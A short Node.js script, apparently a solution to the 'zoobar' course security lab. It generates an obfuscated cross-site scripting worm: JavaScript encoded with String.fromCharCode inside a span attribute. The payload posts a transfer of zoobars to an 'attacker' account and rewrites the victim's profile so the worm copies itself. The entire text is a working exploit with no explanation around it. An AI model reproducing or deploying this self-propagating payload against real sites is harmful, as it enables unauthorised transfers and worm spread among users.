
var fs, path;
fs = require('fs');
path = require('path');

function inject() {
  var injection = "$.post('http://zoobar.org:5000/transfer', {\
    name: 'attacker',\
    amount: '1'\
  });\
  $.post('http://zoobar.org:5000/update', {\
    profile: $('#userZoobars').next().next().html()\
  });";
  return toCharCodes(injection);
}

function toCharCodes (s) {
  var ascii_codes, i
  ascii_codes = [];
  for (i = 0; i < s.length; i++) {
    ascii_codes.push(s.charCodeAt(i));
  }
  return ascii_codes;
}

contents = '<span id="zoobars" class="setTimeout(String.fromCharCode(';
contents += String(inject());
contents += '),0)"></span>\n';

fs.writeFileSync( path.resolve( __dirname, 'e.txt'), contents );
